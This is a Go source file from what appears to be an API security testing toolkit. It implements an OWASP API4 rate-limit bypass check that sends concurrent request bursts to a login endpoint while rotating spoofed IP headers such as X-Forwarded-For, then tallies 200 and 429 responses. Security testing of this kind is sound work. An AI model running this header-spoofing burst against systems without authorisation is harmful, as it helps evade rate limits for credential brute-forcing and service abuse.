// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package api

// OWASP API4:2023 — Unrestricted Resource Consumption (Rate Limit Bypass)
//
// Sends burst requests with rotating IP-spoofing headers to check whether the
// server's rate limiter is bound to the authenticated user/session rather than
// the client IP address.
//
// Safety guarantee: production blocklist check runs before any network I/O.

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// RateLimitBypassAttack simulates OWASP API4 — Rate Limit Bypass.
type RateLimitBypassAttack struct {
	client *http.Client
}

// NewRateLimitBypassAttack returns a ready RateLimitBypassAttack.
func NewRateLimitBypassAttack() *RateLimitBypassAttack {
	return &RateLimitBypassAttack{client: &http.Client{Timeout: 5 * time.Second}}
}

// Run fires a burst of requests against targetURL, cycling through a pool of
// spoofed IP headers. It records total successes, 429 responses, and calculates
// whether rate limiting was consistently applied across different IPs.
//
// Recognised params keys:
//   - "endpoint"    string — path to probe (default "/api/login")
//   - "burst"       int    — total requests in the burst (default 100)
//   - "concurrency" int    — parallel goroutines (default 10)
//   - "jwt"         string — optional Bearer token
func (a *RateLimitBypassAttack) Run(ctx context.Context, targetURL string, params map[string]any) (*AttackResult, error) {
	if err := checkTarget(targetURL); err != nil {
		return nil, err
	}

	start := time.Now()
	result := &AttackResult{Technique: "RateLimitBypass"}

	endpoint, _ := params["endpoint"].(string)
	if endpoint == "" {
		endpoint = "/api/login"
	}

	burst := intParam(params, "burst", 100)
	concurrency := intParam(params, "concurrency", 10)
	if concurrency > 50 {
		concurrency = 50 // cap for lab safety
	}

	jwt, _ := params["jwt"].(string)
	url := strings.TrimRight(targetURL, "/") + endpoint

	// Pool of spoofed IPs to rotate through.
	spoofedIPs := generateSpoofedIPs(20)

	var (
		total429    int64
		totalOK     int64
		totalErrors int64
	)

	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup

	for i := 0; i < burst; i++ {
		select {
		case <-ctx.Done():
			wg.Wait()
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		wg.Add(1)
		sem <- struct{}{}
		idx := i
		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			spoofIP := spoofedIPs[idx%len(spoofedIPs)]
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
			if err != nil {
				atomic.AddInt64(&totalErrors, 1)
				return
			}
			req.Header.Set("X-Forwarded-For", spoofIP)
			req.Header.Set("X-Real-IP", spoofIP)
			req.Header.Set("X-Originating-IP", spoofIP)
			req.Header.Set("CF-Connecting-IP", spoofIP)
			if jwt != "" {
				req.Header.Set("Authorization", "Bearer "+jwt)
			}

			resp, err := a.client.Do(req)
			if err != nil {
				atomic.AddInt64(&totalErrors, 1)
				return
			}
			resp.Body.Close()

			switch resp.StatusCode {
			case http.StatusTooManyRequests:
				atomic.AddInt64(&total429, 1)
			case http.StatusOK, http.StatusCreated, http.StatusNoContent:
				atomic.AddInt64(&totalOK, 1)
			}
		}()
	}
	wg.Wait()

	ok := atomic.LoadInt64(&totalOK)
	rl := atomic.LoadInt64(&total429)
	errs := atomic.LoadInt64(&totalErrors)

	// If we got many 200s and few/no 429s, rate limiting is not working.
	if rl == 0 && ok > 0 {
		result.Success = true
		result.Evidence = append(result.Evidence,
			fmt.Sprintf("RateLimitBypass: sent %d requests with rotating IPs — %d succeeded, 0 rate-limited; rate limiting appears absent", burst, ok))
	} else if ok > 0 && rl > 0 {
		bypassRate := float64(ok) / float64(ok+rl) * 100
		if bypassRate > 50 {
			result.Success = true
		}
		result.Evidence = append(result.Evidence,
			fmt.Sprintf("RateLimitBypass: sent %d requests — %d OK, %d 429, %d errors; bypass rate %.1f%%",
				burst, ok, rl, errs, bypassRate))
	} else {
		result.Evidence = append(result.Evidence,
			fmt.Sprintf("RateLimitBypass: sent %d requests — %d OK, %d 429, %d errors; rate limiting appears effective",
				burst, ok, rl, errs))
	}

	result.Duration = time.Since(start)
	return result, nil
}

// generateSpoofedIPs generates n distinct private-range IP strings for header rotation.
func generateSpoofedIPs(n int) []string {
	ips := make([]string, n)
	for i := 0; i < n; i++ {
		ips[i] = fmt.Sprintf("10.%d.%d.%d", (i/256)%256, i%256, 1)
	}
	return ips
}
